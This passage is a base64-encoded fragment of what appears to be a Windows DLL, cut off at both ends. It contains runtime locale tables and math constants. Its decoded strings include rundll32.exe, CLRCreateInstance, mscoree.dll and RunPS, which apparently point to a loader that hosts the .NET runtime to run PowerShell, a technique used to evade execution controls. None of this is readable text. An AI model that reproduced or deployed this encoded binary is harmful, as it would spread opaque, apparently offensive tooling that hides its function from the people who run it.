19jZ2tvc3d7f4OHi4+Tl5ufo6err7O3u7/Dx8vP09fb3+Pn6+/z9/v8BAAAAmAQBEAIAAACgBAEQAwAAAKgEARAEAAAAsAQBEAUAAADABAEQBgAAAMgEARAHAAAA0AQBEAgAAADYBAEQCQAAAOAEARAKAAAA6AQBEAsAAADwBAEQDAAAAPgEARANAAAAAAUBEA4AAAAIBQEQDwAAABAFARAQAAAAGAUBEBEAAAAgBQEQEgAAACgFARATAAAAMAUBEBQAAAA4BQEQFQAAAEAFARAWAAAASAUBEBgAAABQBQEQGQAAAFgFARAaAAAAYAUBEBsAAABoBQEQHAAAAHAFARAdAAAAeAUBEB4AAACABQEQHwAAAIgFARAgAAAAkAUBECEAAACYBQEQIgAAAKAFARAjAAAAqAUBECQAAACwBQEQJQAAALgFARAmAAAAwAUBECcAAADIBQEQKQAAANAFARAqAAAA2AUBECsAAADgBQEQLAAAAOgFARAtAAAA8AUBEC8AAAD4BQEQNgAAAAAGARA3AAAACAYBEDgAAAAQBgEQOQAAABgGARA+AAAAIAYBED8AAAAoBgEQQAAAADAGARBBAAAAOAYBEEMAAABABgEQRAAAAEgGARBGAAAAUAYBEEcAAABYBgEQSQAAAGAGARBKAAAAaAYBEEsAAABwBgEQTgAAAHgGARBPAAAAgAYBEFAAAACIBgEQVgAAAJAGARBXAAAAmAYBEFoAAACgBgEQZQAAAKgGARB/AAAAsAYBEAEEAAC0BgEQAgQAAMAGARADBAAAzAYBEAQEAACk8gAQBQQAANgGARAGBAAA5AYBEAcEAADwBgEQCAQAAPwGARAJBAAAAPYAEAsEAAAIBwEQDAQAABQHARANBAAAIAcBEA4EAAAsBwEQDwQAADgHARAQBAAARAcBEBEEAACA8gAQEgQAAJjyABATBAAAUAcBEBQEAABcBwEQFQQAAGgHARAWBAAAdAcBEBgEAACABwEQGQQAAIwHARAaBAAAmAcBEBsEAACkBwEQHAQAALAHARAdBAAAvAcBEB4EAADIBwEQHwQAANQHARAgBAAA4AcBECEEAADsBwEQIgQAAPgHARAjBAAABAgBECQEAAAQCAEQJQQAABwIARAmBAAAKAgBECcEAAA0CAEQKQQAAEAIARAqBAAATAgBECsEAABYCAEQLAQAAGQIARAtBAAAfAgBEC8EAACICAEQMgQAAJQIARA0BAAAoAgBEDUEAACsCAEQNgQAALgIARA3BAAAxAgBEDgEAADQCAEQOQQAANwIARA6BAAA6AgBEDsEAAD0CAEQPgQAAAAJARA/BAAADAkBEEAEAAAYCQEQQQQAACQJARBDBAAAMAkBEEQEAABICQEQRQQAAFQJARBGBAAAYAkBEEcEAABsCQEQSQQAAHgJARBKBAAAhAkBEEsEAACQCQEQTAQAAJwJARBOBAAAqAkBEE8EAAC0CQEQUAQAAMAJARBSBAAAzAkBEFYEAADYCQEQVwQAAOQJARBaBAAA9AkBEGUEAAAECgEQawQAABQKARBsBAAAJAoBEIEEAAAwCgEQAQgAADwKARAECAAAjPIAEAcIAABICgEQCQgAAFQKARAKCAAAYAoBEAwIAABsCgEQEAgAAHgKARATCAAAhAoBEBQIAACQCgEQFggAAJwKARAaCAAAqAoBEB0IAADACgEQLAgAAMwKARA7CAAA5AoBED4IAADwCgEQQwgAAPwKARBrCAAAFAsBEAEMAAAkCwEQBAwAADALARAHDAAAPAsBEAkMAABICwEQCgwAAFQLARAMDAAAYAsBEBoMAABsCwEQOwwAAIQLARBrDAAAkAsBEAEQAACgCwEQBBAAAKwLARAHEAAAuAsBEAkQAADECwEQChAAANALARAMEAAA3AsBEBoQAADoCwEQOxAAAPQLARABFAAABAwBEAQUAAAQDAEQBxQAABwMARAJFAAAKAwBEAoUAAA0DAEQDBQAAEAMARAaFAAATAwBEDsUAABkDAEQARgAAHQMARAJGAAAgAwBEAoYAACMDAEQDBgAAJgMARAaGAAApAwBEDsYAAC8DAEQARwAAMwMARAJHAAA2AwBEAocAADkDAEQGhwAAPAMARA7HAAACA0BEAEgAAAYDQEQCSAAACQNARAKIAAAMA0BEDsgAAA8DQEQASQAAEwNARAJJAAAWA0BEAokAABkDQEQOyQAAHANARABKAAAgA0BEAkoAACMDQEQCigAAJgNARABLAAApA0BEAksAACwDQEQCiwAALwNARABMAAAyA0BEAkwAADUDQEQCjAAAOANARABNAAA7A0BEAk0AAD4DQEQCjQAAAQOARABOAAAEA4BEAo4AAAcDgEQATwAACgOARAKPAAANA4BEAFAAABADgEQCkAAAEwOARAKRAAAWA4BEApIAABkDgEQCkwAAHAOARAKUAAAfA4BEAR8AACIDgEQGnwAAJgOARBhAHIAAAAAAGIAZwAAAAAAYwBhAAAAAAB6AGgALQBDAEgAUwAAAAAAYwBzAAAAAABkAGEAAAAAAGQAZQAAAAAAZQBsAAAAAABlAG4AAAAAAGUAcwAAAAAAZgBpAAAAAABmAHIAAAAAAGgAZQAAAAAAaAB1AAAAAABpAHMAAAAAAGkAdAAAAAAAagBhAAAAAABrAG8AAAAAAG4AbAAAAAAAbgBvAAAAAABwAGwAAAAAAHAAdAAAAAAAcgBvAAAAAAByAHUAAAAAAGgAcgAAAAAAcwBrAAAAAABzAHEAAAAAAHMAdgAAAAAAdABoAAAAAAB0AHIAAAAAAHUAcgAAAAAAaQBkAAAAAAB1AGsAAAAAAGIAZQAAAAAAcwBsAAAAAABlAHQAAAAAAGwAdgAAAAAAbAB0AAAAAABmAGEAAAAAAHYAaQAAAAAAaAB5AAAAAABhAHoAAAAAAGUAdQAAAAAAbQBrAAAAAABhAGYAAAAAAGsAYQAAAAAAZgBvAAAAAABoAGkAAAAAAG0AcwAAAAAAawBrAAAAAABrAHkAAAAAAHMAdwAAAAAAdQB6AAAAAAB0AHQAAAAAAHAAYQAAAAAAZwB1AAAAAAB0AGEAAAAAAHQAZQAAAAAAawBuAAAAAABtAHIAAAAAAHMAYQAAAAAAbQBuAAAAAABnAGwAAAAAAGsAbwBrAAAAcwB5AHIAAABkAGkAdgAAAAAAAABhAHIALQBTAEEAAABiAGcALQBCAEcAAABjAGEALQBFAFMAAABjAHMALQBDAFoAAABkAGEALQBEAEsAAABkAGUALQBEAEUAAABlAGwALQBHAFIAAABmAGkALQBGAEkAAABmAHIALQBGAFIAAABoAGUALQBJAEwAAABoAHUALQBIAFUAAABpAHMALQBJAFMAAABpAHQALQBJAFQAAABuAGwALQBOAEwAAABuAGIALQBOAE8AAABwAGwALQBQAEwAAABwAHQALQBCAFIAAAByAG8ALQBSAE8AAAByAHUALQBSAFUAAABoAHIALQBIAFIAAABzAGsALQBTAEsAAABzAHEALQBBAEwAAABzAHYALQBTAEUAAAB0AGgALQBUAEgAAAB0AHIALQBUAFIAAAB1AHIALQBQAEsAAABpAGQALQBJAEQAAAB1AGsALQBVAEEAAABiAGUALQBCAFkAAABzAGwALQBTAEkAAABlAHQALQBFAEUAAABsAHYALQBMAFYAAABsAHQALQBMAFQAAABmAGEALQBJAFIAAAB2AGkALQBWAE4AAABoAHkALQBBAE0AAABhAHoALQBBAFoALQBMAGEAdABuAAAAAABlAHUALQBFAFMAAABtAGsALQBNAEsAAAB0AG4ALQBaAEEAAAB4AGgALQBaAEEAAAB6AHUALQBaAEEAAABhAGYALQBaAEEAAABrAGEALQBHAEUAAABmAG8ALQBGAE8AAABoAGkALQBJAE4AAABtAHQALQBNAFQAAABzAGUALQBOAE8AAABtAHMALQBNAFkAAABrAGsALQBLAFoAAABrAHkALQBLAEcAAABzAHcALQBLAEUAAAB1AHoALQBVAFoALQBMAGEAdABuAAAAAAB0AHQALQBSAFUAAABiAG4ALQBJAE4AAABwAGEALQBJAE4AAABnAHUALQBJAE4AAAB0AGEALQBJAE4AAAB0AGUALQBJAE4AAABrAG4ALQBJAE4AAABtAGwALQBJAE4AAABtAHIALQBJAE4AAABzAGEALQBJAE4AAABtAG4ALQBNAE4AAABjAHkALQBHAEIAAABnAGwALQBFAFMAAABrAG8AawAtAEkATgAAAAAAcwB5AHIALQBTAFkAAAAAAGQAaQB2AC0ATQBWAAAAAABxAHUAegAtAEIATwAAAAAAbgBzAC0AWgBBAAAAbQBpAC0ATgBaAAAAYQByAC0ASQBRAAAAZABlAC0AQwBIAAAAZQBuAC0ARwBCAAAAZQBzAC0ATQBYAAAAZgByAC0AQgBFAAAAaQB0AC0AQwBIAAAAbgBsAC0AQgBFAAAAbgBuAC0ATgBPAAAAcAB0AC0AUABUAAAAcwByAC0AUwBQAC0ATABhAHQAbgAAAAAAcwB2AC0ARgBJAAAAYQB6AC0AQQBaAC0AQwB5AHIAbAAAAAAAcwBlAC0AUwBFAAAAbQBzAC0AQgBOAAAAdQB6AC0AVQBaAC0AQwB5AHIAbAAAAAAAcQB1AHoALQBFAEMAAAAAAGEAcgAtAEUARwAAAHoAaAAtAEgASwAAAGQAZQAtAEEAVAAAAGUAbgAtAEEAVQAAAGUAcwAtAEUAUwAAAGYAcgAtAEMAQQAAAHMAcgAtAFMAUAAtAEMAeQByAGwAAAAAAHMAZQAtAEYASQAAAHEAdQB6AC0AUABFAAAAAABhAHIALQBMAFkAAAB6AGgALQBTAEcAAABkAGUALQBMAFUAAABlAG4ALQBDAEEAAABlAHMALQBHAFQAAABmAHIALQBDAEgAAABoAHIALQBCAEEAAABzAG0AagAtAE4ATwAAAAAAYQByAC0ARABaAAAAegBoAC0ATQBPAAAAZABlAC0ATABJAAAAZQBuAC0ATgBaAAAAZQBzAC0AQwBSAAAAZgByAC0ATABVAAAAYgBzAC0AQgBBAC0ATABhAHQAbgAAAAAAcwBtAGoALQBTAEUAAAAAAGEAcgAtAE0AQQAAAGUAbgAtAEkARQAAAGUAcwAtAFAAQQAAAGYAcgAtAE0AQwAAAHMAcgAtAEIAQQAtAEwAYQB0AG4AAAAAAHMAbQBhAC0ATgBPAAAAAABhAHIALQBUAE4AAABlAG4ALQBaAEEAAABlAHMALQBEAE8AAABzAHIALQBCAEEALQBDAHkAcgBsAAAAAABzAG0AYQAtAFMARQAAAAAAYQByAC0ATwBNAAAAZQBuAC0ASgBNAAAAZQBzAC0AVgBFAAAAcwBtAHMALQBGAEkAAAAAAGEAcgAtAFkARQAAAGUAbgAtAEMAQgAAAGUAcwAtAEMATwAAAHMAbQBuAC0ARgBJAAAAAABhAHIALQBTAFkAAABlAG4ALQBCAFoAAABlAHMALQBQAEUAAABhAHIALQBKAE8AAABlAG4ALQBUAFQAAABlAHMALQBBAFIAAABhAHIALQBMAEIAAABlAG4ALQBaAFcAAABlAHMALQBFAEMAAABhAHIALQBLAFcAAABlAG4ALQBQAEgAAABlAHMALQBDAEwAAABhAHIALQBBAEUAAABlAHMALQBVAFkAAABhAHIALQBCAEgAAABlAHMALQBQAFkAAABhAHIALQBRAEEAAABlAHMALQBCAE8AAABlAHMALQBTAFYAAABlAHMALQBIAE4AAABlAHMALQBOAEkAAABlAHMALQBQAFIAAAB6AGgALQBDAEgAVAAAAAAAcwByAAAAAACwBgEQQgAAAAAGARAsAAAAwBUBEHEAAACYBAEQAAAAAMwVARDYAAAA2BUBENoAAADkFQEQsQAAAPAVARCgAAAA/BUBEI8AAAAIFgEQzwAAABQWARDVAAAAIBYBENIAAAAsFgEQqQAAADgWARC5AAAARBYBEMQAAABQFgEQ3AAAAFwWARBDAAAAaBYBEMwAAAB0FgEQvwAAAIAWARDIAAAA6AUBECkAAACMFgEQmwAAAKQWARBrAAAAqAUBECEAAAC8FgEQYwAAAKAEARABAAAAyBYBEEQAAADUFgEQfQAAAOAWARC3AAAAqAQBEAIAAAD4FgEQRQAAAMAEARAEAAAABBcBEEcAAAAQFwEQhwAAAMgEARAFAAAAHBcBEEgAAADQBAEQBgAAACgXARCiAAAANBcBEJEAAABAFwEQSQAAAEwXARCzAAAAWBcBEKsAAACoBgEQQQAAAGQXARCLAAAA2AQBEAcAAAB0FwEQSgAAAOAEARAIAAAAgBcBEKMAAACMFwEQzQAAAJgXARCsAAAApBcBEMkAAACwFwEQkgAAALwXARC6AAAAyBcBEMUAAADUFwEQtAAAAOAXARDWAAAA7BcBENAAAAD4FwEQSwAAAAQYARDAAAAAEBgBENMAAADoBAEQCQAAABwYARDRAAAAKBgBEN0AAAA0GAEQ1wAAAEAYARDKAAAATBgBELUAAABYGAEQwQAAAGQYARDUAAAAcBgBEKQAAAB8GAEQrQAAAIgYARDfAAAAlBgBEJMAAACgGAEQ4AAAAKwYARC7AAAAuBgBEM4AAADEGAEQ4QAAANAYARDbAAAA3BgBEN4AAADoGAEQ2QAAAPQYARDGAAAAuAUBECMAAAAAGQEQZQAAAPAFARAqAAAADBkBEGwAAADQBQEQJgAAABgZARBoAAAA8AQBEAoAAAAkGQEQTAAAABAGARAuAAAAMBkBEHMAAAD4BAEQCwAAADwZARCUAAAASBkBEKUAAABUGQEQrgAAAGAZARBNAAAAbBkBELYAAAB4GQEQvAAAAJAGARA+AAAAhBkBEIgAAABYBgEQNwAAAJAZARB/AAAAAAUBEAwAAACcGQEQTgAAABgGARAvAAAAqBkBEHQAAABgBQEQGAAAALQZARCvAAAAwBkBEFoAAAAIBQEQDQAAAMwZARBPAAAA4AUBECgAAADYGQEQagAAAJgFARAfAAAA5BkBEGEAAAAQBQEQDgAAAPAZARBQAAAAGAUBEA8AAAD8GQEQlQAAAAgaARBRAAAAIAUBEBAAAAAUGgEQUgAAAAgGARAtAAAAIBoBEHIAAAAoBgEQMQAAACwaARB4AAAAcAYBEDoAAAA4GgEQggAAACgFARARAAAAmAYBED8AAABEGgEQiQAAAFQaARBTAAAAMAYBEDIAAABgGgEQeQAAAMgFARAlAAAAbBoBEGcAAADABQEQJAAAAHgaARBmAAAAhBoBEI4AAAD4BQEQKwAAAJAaARBtAAAAnBoBEIMAAACIBgEQPQAAAKgaARCGAAAAeAYBEDsAAAC0GgEQhAAAACAGARAwAAAAwBoBEJ0AAADMGgEQdwAAANgaARB1AAAA5BoBEFUAAAAwBQEQEgAAAPAaARCWAAAA/BoBEFQAAAAIGwEQlwAAADgFARATAAAAFBsBEI0AAABQBgEQNgAAACAbARB+AAAAQAUBEBQAAAAsGwEQVgAAAEgFARAVAAAAOBsBEFcAAABEGwEQmAAAAFAbARCMAAAAYBsBEJ8AAABwGwEQqAAAAFAFARAWAAAAgBsBEFgAAABYBQEQFwAAAIwbARBZAAAAgAYBEDwAAACYGwEQhQAAAKQbARCnAAAAsBsBEHYAAAC8GwEQnAAAAGgFARAZAAAAyBsBEFsAAACwBQEQIgAAANQbARBkAAAA4BsBEL4AAADwGwEQwwAAAAAcARCwAAAAEBwBELgAAAAgHAEQywAAADAcARDHAAAAcAUBEBoAAABAHAEQXAAAAJgOARDjAAAATBwBEMIAAABkHAEQvQAAAHwcARCmAAAAlBwBEJkAAAB4BQEQGwAAAKwcARCaAAAAuBwBEF0AAAA4BgEQMwAAAMQcARB6AAAAoAYBEEAAAADQHAEQigAAAGAGARA4AAAA4BwBEIAAAABoBgEQOQAAAOwcARCBAAAAgAUBEBwAAAD4HAEQXgAAAAQdARBuAAAAiAUBEB0AAAAQHQEQXwAAAEgGARA1AAAAHB0BEHwAAACgBQEQIAAAACgdARBiAAAAkAUBEB4AAAA0HQEQYAAAAEAGARA0AAAAQB0BEJ4AAABYHQEQewAAANgFARAnAAAAcB0BEGkAAAB8HQEQbwAAAIgdARADAAAAmB0BEOIAAACoHQEQkAAAALQdARChAAAAwB0BELIAAADMHQEQqgAAANgdARBGAAAA5B0BEHAAAABhAGYALQB6AGEAAABhAHIALQBhAGUAAABhAHIALQBiAGgAAABhAHIALQBkAHoAAABhAHIALQBlAGcAAABhAHIALQBpAHEAAABhAHIALQBqAG8AAABhAHIALQBrAHcAAABhAHIALQBsAGIAAABhAHIALQBsAHkAAABhAHIALQBtAGEAAABhAHIALQBvAG0AAABhAHIALQBxAGEAAABhAHIALQBzAGEAAABhAHIALQBzAHkAAABhAHIALQB0AG4AAABhAHIALQB5AGUAAABhAHoALQBhAHoALQBjAHkAcgBsAAAAAABhAHoALQBhAHoALQBsAGEAdABuAAAAAABiAGUALQBiAHkAAABiAGcALQBiAGcAAABiAG4ALQBpAG4AAABiAHMALQBiAGEALQBsAGEAdABuAAAAAABjAGEALQBlAHMAAABjAHMALQBjAHoAAABjAHkALQBnAGIAAABkAGEALQBkAGsAAABkAGUALQBhAHQAAABkAGUALQBjAGgAAABkAGUALQBkAGUAAABkAGUALQBsAGkAAABkAGUALQBsAHUAAABkAGkAdgAtAG0AdgAAAAAAZQBsAC0AZwByAAAAZQBuAC0AYQB1AAAAZQBuAC0AYgB6AAAAZQBuAC0AYwBhAAAAZQBuAC0AYwBiAAAAZQBuAC0AZwBiAAAAZQBuAC0AaQBlAAAAZQBuAC0AagBtAAAAZQBuAC0AbgB6AAAAZQBuAC0AcABoAAAAZQBuAC0AdAB0AAAAZQBuAC0AdQBzAAAAZQBuAC0AegBhAAAAZQBuAC0AegB3AAAAZQBzAC0AYQByAAAAZQBzAC0AYgBvAAAAZQBzAC0AYwBsAAAAZQBzAC0AYwBvAAAAZQBzAC0AYwByAAAAZQBzAC0AZABvAAAAZQBzAC0AZQBjAAAAZQBzAC0AZQBzAAAAZQBzAC0AZwB0AAAAZQBzAC0AaABuAAAAZQBzAC0AbQB4AAAAZQBzAC0AbgBpAAAAZQBzAC0AcABhAAAAZQBzAC0AcABlAAAAZQBzAC0AcAByAAAAZQBzAC0AcAB5AAAAZQBzAC0AcwB2AAAAZQBzAC0AdQB5AAAAZQBzAC0AdgBlAAAAZQB0AC0AZQBlAAAAZQB1AC0AZQBzAAAAZgBhAC0AaQByAAAAZgBpAC0AZgBpAAAAZgBvAC0AZgBvAAAAZgByAC0AYgBlAAAAZgByAC0AYwBhAAAAZgByAC0AYwBoAAAAZgByAC0AZgByAAAAZgByAC0AbAB1AAAAZgByAC0AbQBjAAAAZwBsAC0AZQBzAAAAZwB1AC0AaQBuAAAAaABlAC0AaQBsAAAAaABpAC0AaQBuAAAAaAByAC0AYgBhAAAAaAByAC0AaAByAAAAaAB1AC0AaAB1AAAAaAB5AC0AYQBtAAAAaQBkAC0AaQBkAAAAaQBzAC0AaQBzAAAAaQB0AC0AYwBoAAAAaQB0AC0AaQB0AAAAagBhAC0AagBwAAAAawBhAC0AZwBlAAAAawBrAC0AawB6AAAAawBuAC0AaQBuAAAAawBvAGsALQBpAG4AAAAAAGsAbwAtAGsAcgAAAGsAeQAtAGsAZwAAAGwAdAAtAGwAdAAAAGwAdgAtAGwAdgAAAG0AaQAtAG4AegAAAG0AawAtAG0AawAAAG0AbAAtAGkAbgAAAG0AbgAtAG0AbgAAAG0AcgAtAGkAbgAAAG0AcwAtAGIAbgAAAG0AcwAtAG0AeQAAAG0AdAAtAG0AdAAAAG4AYgAtAG4AbwAAAG4AbAAtAGIAZQAAAG4AbAAtAG4AbAAAAG4AbgAtAG4AbwAAAG4AcwAtAHoAYQAAAHAAYQAtAGkAbgAAAHAAbAAtAHAAbAAAAHAAdAAtAGIAcgAAAHAAdAAtAHAAdAAAAHEAdQB6AC0AYgBvAAAAAABxAHUAegAtAGUAYwAAAAAAcQB1AHoALQBwAGUAAAAAAHIAbwAtAHIAbwAAAHIAdQAtAHIAdQAAAHMAYQAtAGkAbgAAAHMAZQAtAGYAaQAAAHMAZQAtAG4AbwAAAHMAZQAtAHMAZQAAAHMAawAtAHMAawAAAHMAbAAtAHMAaQAAAHMAbQBhAC0AbgBvAAAAAABzAG0AYQAtAHMAZQAAAAAAcwBtAGoALQBuAG8AAAAAAHMAbQBqAC0AcwBlAAAAAABzAG0AbgAtAGYAaQAAAAAAcwBtAHMALQBmAGkAAAAAAHMAcQAtAGEAbAAAAHMAcgAtAGIAYQAtAGMAeQByAGwAAAAAAHMAcgAtAGIAYQAtAGwAYQB0AG4AAAAAAHMAcgAtAHMAcAAtAGMAeQByAGwAAAAAAHMAcgAtAHMAcAAtAGwAYQB0AG4AAAAAAHMAdgAtAGYAaQAAAHMAdgAtAHMAZQAAAHMAdwAtAGsAZQAAAHMAeQByAC0AcwB5AAAAAAB0AGEALQBpAG4AAAB0AGUALQBp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